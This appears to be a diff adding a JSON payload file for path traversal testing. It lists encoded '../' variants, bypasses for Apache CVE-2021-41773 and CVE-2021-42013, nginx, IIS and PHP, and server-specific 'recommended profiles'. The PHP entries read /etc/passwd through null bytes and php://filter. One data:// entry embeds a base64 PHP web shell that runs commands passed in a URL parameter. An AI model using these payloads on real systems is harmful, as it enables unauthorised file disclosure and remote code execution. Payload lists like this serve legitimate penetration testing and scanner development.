@@ -1,0 +1,72 @@
+{
+  "encoding_patterns": {
+    "standard": {
+      "none": "../",
+      "single": "%2e%2e%2f",
+      "double": "%252e%252e%252f",
+      "custom_double": "%%32%65%%32%65/"
+    },
+    
+    "unicode": {
+      "division_slash": "..∕",
+      "fullwidth_slash": "..／",
+      "big_solidus": "..⧸",
+      "utf8_overlong": "..%c0%af",
+      "double_encoded_unicode": "%u002e%u002e%u002f"
+    },
+    
+    "windows": {
+      "backslash": "..\\",
+      "encoded_backslash": "..%5c",
+      "double_encoded_backslash": "%252e%252e%255c"
+    },
+    
+    "apache_specific": {
+      "cve_2021_41773": "%%32%65%%32%65/",
+      "cve_2021_42013": "%%32%65%%32%65%%32%66",
+      "apache_traversal": "....//",
+      "apache_double": "....////"
+    },
+    
+    "nginx_specific": {
+      "encoded_null": "%00",
+      "double_encoded_null": "%2500",
+      "utf8_sequence": "%c0%ae%c0%ae%c0%af"
+    },
+    
+    "iis_specific": {
+      "unicode_iis": "%c0%af",
+      "double_dot": ".../",
+      "iis_short": "..%255c"
+    },
+    
+    "php_specific": {
+      "null_byte": "../etc/passwd%00",
+      "double_null": "../etc/passwd%00.jpg",
+      "php_wrapper": "php://filter/convert.base64-encode/resource=../etc/passwd",
+      "data_wrapper": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+    },
+    
+    "combined_patterns": {
+      "mixed_encoding": "..%252f..%2f..%255c",
+      "unicode_plus_encoding": "..∕%2f..%252f",
+      "triple_encoding": "%2525252e%2525252e%2525252f"
+    },
+    
+    "obfuscation": {
+      "whitespace": ".. /",
+      "tab_separated": "..	/",
+      "multiple_slashes": "../////",
+      "mixed_case": "..%2F",
+      "hex_encoded": "0x2e0x2e0x2f"
+    }
+  },
+  
+  "recommended_profiles": {
+    "apache_24": ["%%32%65%%32%65/", "....//", "%2e%2e%2f"],
+    "nginx": ["..%2f", "%c0%ae%c0%ae%c0%af", "../"],
+    "iis": ["..%255c", "%c0%af", "..././"],
+    "php_apps": ["../etc/passwd%00", "php://filter/convert.base64-encode/resource=../etc/passwd"],
+    "generic_test": ["../", "%2e%2e%2f", "%252e%252e%252f", "..%2f"]
+  }
+}
